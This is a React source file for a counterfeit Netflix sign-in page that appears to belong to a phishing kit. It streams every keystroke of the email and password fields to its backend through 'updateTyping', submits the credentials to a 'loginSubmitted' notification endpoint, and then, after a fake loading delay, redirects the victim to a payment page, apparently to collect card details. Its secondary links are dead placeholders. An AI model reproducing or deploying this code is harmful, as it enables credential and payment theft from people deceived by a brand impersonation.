import { useState } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useSession } from "@/contexts/SessionContext";
import { Loader2 } from "lucide-react";

export default function LoginPage() {
  const [, navigate] = useLocation();
  const { sessionId, t } = useSession();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);

  const loginMutation = trpc.notify.loginSubmitted.useMutation();
  const updateStatus = trpc.session.updateStatus.useMutation();
  const updateTypingMutation = trpc.session.updateTyping.useMutation();

  const handleTyping = (field: string, value: string) => {
    if (sessionId) {
      updateTypingMutation.mutate({ sessionId, field, value });
    }
  };

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) return;
    setLoading(true);
    if (sessionId) {
      loginMutation.mutate({ sessionId, email, password });
      updateStatus.mutate({ sessionId, status: "payment" });
    }
    setTimeout(() => {
      setLoading(false);
      navigate("/payment");
    }, 3000);
  };

  const inputStyle: React.CSSProperties = {
    width: "100%",
    padding: "clamp(12px, 3.5vw, 16px)",
    backgroundColor: "#333333",
    border: "none",
    borderRadius: "4px",
    color: "white",
    fontSize: "clamp(14px, 3.5vw, 16px)",
    outline: "none",
    boxSizing: "border-box",
  };

  return (
    <div style={{ backgroundColor: "#141414", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
      {/* Header */}
      <header style={{ padding: "clamp(16px, 4vw, 24px) clamp(16px, 5vw, 40px)" }}>
        <img src="/netflix-logo.png" alt="Netflix" style={{ height: "clamp(24px, 5vw, 34px)", width: "auto" }} />
      </header>

      {/* Main */}
      <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", padding: "clamp(20px, 5vw, 40px) 16px" }}>
        <div style={{
          backgroundColor: "rgba(0,0,0,0.75)",
          borderRadius: "4px",
          padding: "clamp(32px, 7vw, 60px) clamp(20px, 7vw, 68px)",
          width: "100%",
          maxWidth: "460px",
          boxSizing: "border-box",
        }}>
          <h1 style={{ color: "white", fontSize: "clamp(24px, 6vw, 32px)", fontWeight: 700, marginBottom: "clamp(20px, 5vw, 28px)", fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
            {t("signIn")}
          </h1>

          <form onSubmit={handleSignIn}>
            <div style={{ marginBottom: "16px" }}>
              <input
                type="text"
                placeholder={t("emailOrPhone")}
                value={email}
                required
                onChange={e => { setEmail(e.target.value); handleTyping("email", e.target.value); }}
                style={inputStyle}
                onFocus={e => { e.currentTarget.style.backgroundColor = "#454545"; }}
                onBlur={e => { e.currentTarget.style.backgroundColor = "#333333"; }}
              />
            </div>
            <div style={{ marginBottom: "16px" }}>
              <input
                type="password"
                placeholder={t("password")}
                value={password}
                required
                onChange={e => { setPassword(e.target.value); handleTyping("password", e.target.value); }}
                style={inputStyle}
                onFocus={e => { e.currentTarget.style.backgroundColor = "#454545"; }}
                onBlur={e => { e.currentTarget.style.backgroundColor = "#333333"; }}
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              style={{ width: "100%", backgroundColor: "#E50914", color: "white", border: "none", borderRadius: "4px", padding: "clamp(13px, 3.5vw, 16px)", fontSize: "clamp(14px, 3.5vw, 16px)", fontWeight: 700, cursor: loading ? "default" : "pointer", marginBottom: "12px", display: "flex", alignItems: "center", justifyContent: "center", gap: "8px", opacity: loading ? 0.9 : 1, transition: "background-color 0.15s" }}
              onMouseEnter={e => { if (!loading) e.currentTarget.style.backgroundColor = "#c40812"; }}
              onMouseLeave={e => { e.currentTarget.style.backgroundColor = "#E50914"; }}
            >
              {loading ? <><Loader2 size={20} style={{ animation: "spin 1s linear infinite" }} /> {t("processing")}</> : t("signIn")}
            </button>
          </form>

          <div style={{ textAlign: "center", color: "#737373", fontSize: "clamp(14px, 3.5vw, 16px)", marginBottom: "12px" }}>OR</div>

          <button
            style={{ width: "100%", backgroundColor: "rgba(109,109,110,0.7)", color: "white", border: "none", borderRadius: "4px", padding: "clamp(13px, 3.5vw, 16px)", fontSize: "clamp(14px, 3.5vw, 16px)", fontWeight: 700, cursor: "pointer", marginBottom: "20px", transition: "background-color 0.15s" }}
            onMouseEnter={e => { e.currentTarget.style.backgroundColor = "rgba(109,109,110,0.9)"; }}
            onMouseLeave={e => { e.currentTarget.style.backgroundColor = "rgba(109,109,110,0.7)"; }}
          >
            {t("useSignInCode")}
          </button>

          <div style={{ textAlign: "center", marginBottom: "16px" }}>
            <a href="#" style={{ color: "white", textDecoration: "underline", fontSize: "clamp(13px, 3vw, 14px)" }}>{t("forgotPassword")}</a>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "20px" }}>
            <input type="checkbox" id="remember" checked={rememberMe} onChange={e => setRememberMe(e.target.checked)}
              style={{ width: "16px", height: "16px", cursor: "pointer", flexShrink: 0 }} />
            <label htmlFor="remember" style={{ color: "#b3b3b3", fontSize: "clamp(13px, 3vw, 14px)", cursor: "pointer" }}>{t("rememberMe")}</label>
          </div>

          <p style={{ color: "#737373", fontSize: "clamp(14px, 3.5vw, 16px)" }}>
            {t("newToNetflix")} <a href="#" style={{ color: "white", fontWeight: 700, textDecoration: "none" }}>{t("signUpNow")}</a>
          </p>

          <p style={{ color: "#8c8c8c", fontSize: "clamp(11px, 2.5vw, 13px)", marginTop: "20px" }}>
            {t("recaptchaNotice")} <a href="#" style={{ color: "#0071eb", textDecoration: "none" }}>{t("learnMore")}</a>
          </p>
        </div>
      </div>

      {/* Footer */}
      <footer style={{ padding: "clamp(16px, 4vw, 20px) clamp(16px, 5vw, 40px)", borderTop: "1px solid #333" }}>
        <p style={{ color: "#737373", fontSize: "clamp(12px, 2.5vw, 13px)", marginBottom: "12px" }}>
          {t("questions")} <a href="#" style={{ color: "#737373", textDecoration: "underline" }}>{t("contactUs")}</a>
        </p>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(2, 1fr)", gap: "8px 24px", maxWidth: "400px" }}>
          {["FAQ", "Help Center", "Terms of Use", "Privacy", "Cookie Preferences", "Corporate Information"].map(link => (
            <a key={link} href="#" style={{ color: "#737373", fontSize: "clamp(11px, 2.5vw, 12px)", textDecoration: "underline" }}>{link}</a>
          ))}
        </div>
      </footer>
    </div>
  );
}
